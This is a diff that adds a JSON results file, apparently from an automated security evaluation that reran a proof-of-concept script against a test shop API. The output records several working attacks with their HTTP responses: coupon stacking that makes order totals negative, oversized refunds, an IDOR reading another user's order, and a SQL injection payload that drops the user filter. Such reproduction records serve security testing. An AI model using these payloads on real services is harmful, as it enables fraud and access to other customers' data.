@@ -1,0 +1,21 @@
+{
+  "scripts": [
+    {
+      "id": "primary-money-findings",
+      "status": "passed",
+      "path": "agents/agent-1/repro_money.py",
+      "service_port": null,
+      "seed": null,
+      "files": [],
+      "seed_token_sha256": {},
+      "script_sha256": "cca59eb46c84f42a747927cca100ce5a8a4da17db4b22cb6cd498feb627b5469",
+      "attachment_sha256": {},
+      "exit_code": 0,
+      "output": "== A. stacked coupons make order total negative, balance grows ==\nclaimed: {'id': 1, 'code': 'SAVE60A'} {'id': 2, 'code': 'SAVE60B'} balance before: 20000\n--- POST /orders/with-coupon [a1,a2]\nHTTP 200 {\"id\":1,\"total\":-2000,\"status\":\"placed\"}\nbalance after: 22000 order row: {\"id\":1,\"user_id\":1,\"product_id\":1,\"quantity\":1,\"total\":-2000,\"status\":\"placed\",\"created_at\":\"2026-09-26 03:18:00\"}\n\n== B. same coupon id repeated in coupon_ids multiplies its discount ==\nclaimed: {'id': 3, 'code': 'SAVE60A'} balance before: 22000\n--- POST /orders/with-coupon [a3,a3,a3,a3]\nHTTP 200 {\"id\":2,\"total\":-14000,\"status\":\"placed\"}\nbalance after: 36000\n\n== C. refund amount above remaining / above order total ==\n--- POST /orders (plain, total 10000)\nHTTP 200 {\"id\":3,\"total\":10000,\"status\":\"placed\"}\nbalance before refund: 26000\n--- POST /orders/{id}/refund amount=100000\nHTTP 200 {\"id\":1,\"order_id\":3,\"amount\":100000,\"balance\":126000}\nbalance after refund: 126000 summary: {\"order_id\":3,\"paid\":10000,\"refund_count\":1,\"refunded\":100000,\"remaining\":-90000}\n\n== D. negative refund amount accepted ==\n--- POST /orders/{id}/refund amount=-5000\nHTTP 409 {\"detail\":\"order already refunded\"}\nbalance after: 126000 summary: {\"order_id\":3,\"paid\":10000,\"refund_count\":1,\"refunded\":100000,\"remaining\":-90000}\n\n== E. /orders/{order_id} has no ownership check (IDOR) ==\n--- bob order id\nHTTP 200 {\"id\":4,\"total\":10000,\"status\":\"placed\"}\n--- alice GET bob's order via /orders/{id}\nHTTP 200 {\"id\":4,\"user_id\":2,\"product_id\":1,\"quantity\":1,\"total\":10000,\"status\":\"placed\",\"created_at\":\"2026-09-26 03:18:00\"}\n--- bob GET bob's order via /orders/{id}\nHTTP 200 {\"id\":4,\"user_id\":2,\"product_id\":1,\"quantity\":1,\"total\":10000,\"status\":\"placed\",\"created_at\":\"2026-09-26 03:18:00\"}\n\n== F. /orders/search SQL injection drops the user_id filter ==\n--- alice search q=%' OR 1=1 OR p.name LIKE '%\nHTTP 200 [{\"id\":4,\"user_id\":2,\"product_id\":1,\"quantity\":1,\"total\":10000,\"status\":\"placed\",\"created_at\":\"2026-09-26 03:18:00\"},{\"id\":3,\"user_id\":1,\"product_id\":1,\"quantity\":1,\"total\":10000,\"status\":\"placed\",\"created_at\":\"2026-09-26 03:18:00\"},{\"id\":2,\"user_id\":1,\"product_id\":1,\"quantity\":1,\"total\":-14000,\"status\":\"placed\",\"created_at\":\"2026-09-26 03:18:00\"},{\"id\":1,\"user_id\":1,\"product_id\":1,\"quantity\":1,\"total\":-2000,\"status\":\"placed\",\"created_at\":\"2026-09-26 03:18:00\"}]\nalice own /orders ids: [3, 2, 1]\nbob own /orders ids: [4]\n"
+    }
+  ],
+  "reproducibility": 1.0,
+  "image": "bbx-eval-env:latest",
+  "target_sha256": "634b36609eb0f2d7516bf64d5b0ad7f5ab1218faa36dad4bdab4c42316216edf",
+  "scope": "selected standalone Python scripts, each in a fresh offline container"
+}
